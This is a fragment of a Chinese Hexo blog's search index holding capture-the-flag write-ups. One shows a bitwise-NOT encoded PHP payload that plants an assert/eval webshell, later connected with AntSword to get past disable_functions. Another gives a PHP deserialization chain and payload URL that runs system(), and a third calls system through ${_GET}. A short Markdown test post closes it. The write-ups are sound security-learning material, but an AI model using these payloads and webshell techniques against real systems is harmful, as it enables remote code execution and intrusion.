    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">40</span>)&#123;       <span class="hljs-comment">//长度限制</span><br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;This is too Long.&quot;</span>);<br>                                                &#125;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;   <span class="hljs-comment">//$code中不能出现字母和数字</span><br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>                                                &#125;<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-comment">// ?&gt;</span><br></code></pre></td></tr></table></figure><p>这是一道<strong>无字母数字RCE</strong>  </p><p>绕过方法有很多，比如<strong>取反</strong>、<strong>异或</strong>等。</p><p>传入<code>phpinfo()</code>测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">urlende</span>(~(<span class="hljs-string">&quot;phpinfo&quot;</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-comment">//%8F%97%8F%96%91%99%90</span><br></code></pre></td></tr></table></figure><blockquote><p>直接将命令异或或者取反即可 取反后也有带数字字母的编码，为什么就可以呢，因为取反后url进行编码会将其编码为无法识别的字符，从而绕过无字母无数字的过滤</p><p>还有为什么不能直接<code>phpinfo()</code>取反 </p><p>当 <code>(~%8F%97%8F%96%91%99%90%D7%D6);</code>被当作代码执行时的第一步就是取反操作 <code>~</code></p><p>但是取反得到的字符串 <code>phpinfo()</code>并不会被当作代码执行，因为在取反之前PHP解释器并不知道这原来是 <code>phpinfo()</code></p></blockquote><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?code<span class="hljs-operator">=</span>(~<span class="hljs-variable">%8</span>F<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span class="hljs-variable">%99</span><span class="hljs-variable">%90</span>)()<span class="hljs-comment">;  //注意~在括号里面，最后要带；</span><br></code></pre></td></tr></table></figure><p>这样相当于<code>&quot;phpinfo&quot;();</code>，即<code>phpinfo();</code> <em>(php可变函数)</em></p><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230901/2023090101.62vljstt0t80.png" alt="2023090101"></p><p>禁用了很多函数  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php">pcntl_alarm<br>pcntl_fork,<br>pcntl_waitpid,<br>pcntl_wait,<br>pcntl_wifexited,<br>pcntl_wifstopped,<br>pcntl_wifsignaled,<br>pcntl_wifcontinued,<br>pcntl_wexitstatus,<br>pcntl_wtermsig,<br>pcntl_wstopsig,<br>pcntl_signal,<br>pcntl_signal_get_handler,<br>pcntl_signal_dispatch,<br>pcntl_get_last_error,<br>pcntl_strerror,<br>pcntl_sigprocmask,<br>pcntl_sigwaitinfo,<br>pcntl_sigtimedwait,<br>pcntl_exec,<br>pcntl_getpriority,<br>pcntl_setpriority,<br>pcntl_async_signals,<br>system,exec,<br>shell_exec,<br>popen,<br>proc_open,<br>passthru,<br>symlink,<br>link,<br>syslog,<br>imap_open,<br>ld,<br>dl<br></code></pre></td></tr></table></figure><blockquote><p>为了安全起见，很多运维人员会禁用<code>PHP</code>的一些“危险”函数，例如<code>eval</code>、exec、system等，将其写在<code>php.ini</code>配置文件中，就是我们所说的<code>disable_functions</code>了，特别是虚拟主机运营商，为了彻底隔离同服务器的客户，以及避免出现大面积的安全问题，在<code>disable_functions</code>的设置中也通常较为严格。如果在渗透时，上传了<code>webshell</code>却因为<code>disable_functions</code>禁用了我们函数而无法执行命令的话，这时候就需要想办法进行绕过，突破<code>disable_functions</code>。  </p></blockquote><h2 id="构造shell"><a href="#构造shell" class="headerlink" title="构造shell"></a>构造shell</h2><blockquote><p>在这里，我们不能直接使用eval 因为  所以为我们无法通过变量函数的方法进行调用。<br>在这里，我们使用 assert 来构造，但由于php版本问题，我们并不能直接构造&lt;?php assert($_POST[‘a’]);&gt;</p><p>我们需要调用eval<br>拼接为 <code>assert（eval($_POST[test])）</code></p></blockquote><p><em>翻了十几篇博客，大部分没有解释这个马是怎么来的，只找到这个不怎么清楚的解释</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>])); <span class="hljs-comment">#assert函数是直接将传入的参数当成PHP代码直接，不需要以分号结尾，当然你加上也可以。</span><br></code></pre></td></tr></table></figure><p>构造脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-string">&#x27;(eval($_POST[1]))&#x27;</span>;<br><span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>;<br> <span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//%9E%8C%8C%9A%8D%8B&lt;br&gt;%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?code<span class="hljs-operator">=</span>(~<span class="hljs-variable">%9</span>E<span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>C<span class="hljs-variable">%9</span>A<span class="hljs-variable">%8</span>D<span class="hljs-variable">%8</span>B)(~<span class="hljs-variable">%D7</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%DB</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%CE</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%D6</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>蚁剑连接 </p><p>根目录里有flag和readflag </p><p>flag读不了，只能尝试运行readflag</p><p>而绕过diseable_funtion才能运行readflag  </p><p>可使用蚁剑插件</p><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230901/2023090102.7fs1bcxw1s40.png" alt="2023090102"></p><p>得到flag</p><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230901/2023090103.2u68kgwae6w0.png" alt="2023090103"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/network/263540.html">绕过Disable Functions来搞事情 - FreeBuf网络安全行业门户</a> </p><p>[<a href="https://www.cnblogs.com/l0vehzzz/p/16424027.html">极客大挑战 2019]RCE ME - L0VEhzzz - 博客园 (cnblogs.com)</a> </p><p>[BUUCTF：<a href="https://blog.csdn.net/m0_62879498/article/details/124803318">极客大挑战 2019]RCE ME ——两种方法_hcjtn的博客-CSDN博客</a>  </p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>easy_serialize</title>
    <link href="/2023/04/23/easy-serialize/"/>
    <url>/2023/04/23/easy-serialize/</url>
    
    <content type="html"><![CDATA[<h1 id="easy-serialize"><a href="#easy-serialize" class="headerlink" title="easy_serialize"></a>easy_serialize</h1><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>先上payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://124.220.165.133:9906/?a=O:5:&quot;Hello&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:5:&quot;Uwant&quot;:1:&#123;s:6:&quot;params&quot;;s:32:&quot;system(&#x27;cat /ffffllllaaaagggg&#x27;);&quot;;&#125;&#125;&#125;;&#125;<br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先把网页上的代码拷到vscode里，以便后续查看和修改  </p><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230423/e1.35gzqjp3uli0.png" alt="e1">  </p><p>第40行有个<code>eval</code>函数，那就从这里倒推</p><p><code>eval</code>在<code>getshell</code>函数里，而<code>getshell</code>被<code>__get</code>函数调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()        <span class="hljs-comment">#当一个对象创建时触发     </span><br> <span class="hljs-title function_ invoke__">__destruct</span>()        <span class="hljs-comment">#当一个对象被销毁时触发      </span><br> <span class="hljs-title function_ invoke__">__toString</span>()        <span class="hljs-comment">#把类当作字符串使用时触发      </span><br> <span class="hljs-title function_ invoke__">__get</span>()             <span class="hljs-comment">#用于从不存在或不可访问的属性读取数据时      </span><br></code></pre></td></tr></table></figure><p>显然，在<code>Show</code>类的<code>__tostring()</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当<code>$this-&gt;str[&#39;str&#39;]</code>为类<code>Uwant</code>时，</p><p>这段代码会调用<code>Uwant</code>中不存在的<code>source</code>变量，导致触发<code>__get()</code>  </p><p>接下来，我们分析如何触发<code>__toString()</code>  </p><p>在<code>Hello</code>类中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str=<span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source=<span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;      <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果<code>$this-&gt;source</code>为一个<code>Show</code>类的对象，</p><p>那么<code>__destruct()</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br></code></pre></td></tr></table></figure><p>就是将<code>Show</code>类对象当作字符串使用，</p><p>即触发<code>__toString()</code>  </p><h2 id="分析总结"><a href="#分析总结" class="headerlink" title="分析总结"></a>分析总结</h2><p>我们需要序列化一个<code>Hello</code>类对象，</p><p>这个对象的<code>$str</code>为一个<code>Show</code>类对象，</p><p>该<code>Show</code>类对象的<code>$str[&#39;str&#39;]</code>为一个<code>Uwant</code>类对象。</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Uwant</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>=<span class="hljs-string">&quot;system(&#x27;cat /ffffllllaaaagggg&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>;<br><span class="hljs-variable">$a</span>-&gt;str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br><span class="hljs-variable">$a</span>-&gt;str-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Uwant</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://124.220.165.133:9906/?a=O:5:&quot;Hello&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:5:&quot;Uwant&quot;:1:&#123;s:6:&quot;params&quot;;s:32:&quot;system(&#x27;cat /ffffllllaaaagggg&#x27;);&quot;;&#125;&#125;&#125;;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>php</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web第一周</title>
    <link href="/2023/01/15/web%E7%AC%AC%E4%B8%80%E5%91%A8/"/>
    <url>/2023/01/15/web%E7%AC%AC%E4%B8%80%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="rce2-无字母数字绕过"><a href="#rce2-无字母数字绕过" class="headerlink" title="rce2 (无字母数字绕过)"></a>rce2 (无字母数字绕过)</h1><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/image.2i94qo6in3w0.webp" alt="image"></p><span id="more"></span><h2 id="相关基础知识的了解"><a href="#相关基础知识的了解" class="headerlink" title="相关基础知识的了解"></a>相关基础知识的了解</h2><p>preg_match( )函数：<a href="https://www.php.cn/php-weizijiaocheng-381228.html">php正则表达式中preg_match函数的详解-php教程-PHP中文网</a> </p><p>正则表达式：<a href="https://www.runoob.com/regexp/regexp-tutorial.html">正则表达式 – 教程 | 菜鸟教程 (runoob.com)</a></p><h2 id="题目内容理解"><a href="#题目内容理解" class="headerlink" title="题目内容理解"></a>题目内容理解</h2><p>题目中*preg_match()*过滤了<strong>a-z，0-9，A-Z</strong>字符，</p><p>而用*eval($code)*探索flag需要上述字符，</p><p>因此需要构造其他字符的变换(异或、或、取反等)以实现所需字符的变相输入。</p><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><p>字符位运算无需多说，</p><p>使用文章<a href="https://blog.csdn.net/miuzzx/article/details/109143413"> 无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）_yu22x的博客</a> 上的格式多次尝试，  </p><p>但是网页一片空白。</p><p>浏览别人的博客后，得知要使用<code>$&#123;_GET&#125;[a]($&#123;_GET&#125;[b]);&amp;a=***$b=***</code>格式  </p><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/rce2ffff.3gwo54ngd420.webp" alt="rce2ffff">于是<img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/image.6e7j92zb3sg0.webp" alt="image"> </p><p>payload：<code>?code=$&#123;~%a0%b8%ba%ab&#125;[%aa]($&#123;~%a0%b8%ba%ab&#125;[%bb]);&amp;%aa=system&amp;%bb=cd%20/;cat ffffllllaaaagggg</code></p><h1 id="easy-ssit"><a href="#easy-ssit" class="headerlink" title="easy_ssit"></a>easy_ssit</h1><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/image.24no0lg8giow.webp" alt="imagegg">  </p><p><a href="https://www.freebuf.com/articles/web/279670.html">从0到1:Flask SSTI(服务器模板注入)</a>  </p><h2 id="题目内容理解-1"><a href="#题目内容理解-1" class="headerlink" title="题目内容理解"></a>题目内容理解</h2>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>第一周</tag>
      
      <tag>寒假</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>my-first-blog</title>
    <link href="/2023/01/15/my-first-blog/"/>
    <url>/2023/01/15/my-first-blog/</url>
    
    <content type="html"><![CDATA[<h1 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h1><hr><span id="more"></span><h2 id="Markdown体验还不错"><a href="#Markdown体验还不错" class="headerlink" title="Markdown体验还不错"></a>Markdown体验还不错</h2><hr><p>但是感觉下划线不是很明显啊。  </p><h1 id="新的尝试"><a href="#新的尝试" class="headerlink" title="新的尝试"></a>新的尝试</h1><p><strong>粗体</strong>与<em>斜体</em>  </p><h1 id="标题加粗会怎样"><a href="#标题加粗会怎样" class="headerlink" title="标题加粗会怎样"></a><strong>标题加粗会怎样</strong></h1><h2 id="不会怎样"><a href="#不会怎样" class="headerlink" title="不会怎样"></a>不会怎样</h2><hr><h1 id="神奇的引用"><a href="#神奇的引用" class="headerlink" title="神奇的引用"></a>神奇的引用</h1><blockquote><p>神奇的引用  </p><blockquote><p>神奇的引用</p><p><em>神奇的引用</em></p><ul><li>神奇的引用</li></ul></blockquote></blockquote><h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><hr><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/badgirl.5nlodbxdey80.webp" alt="badgirl"></p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p><code>安徽</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>初体验</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
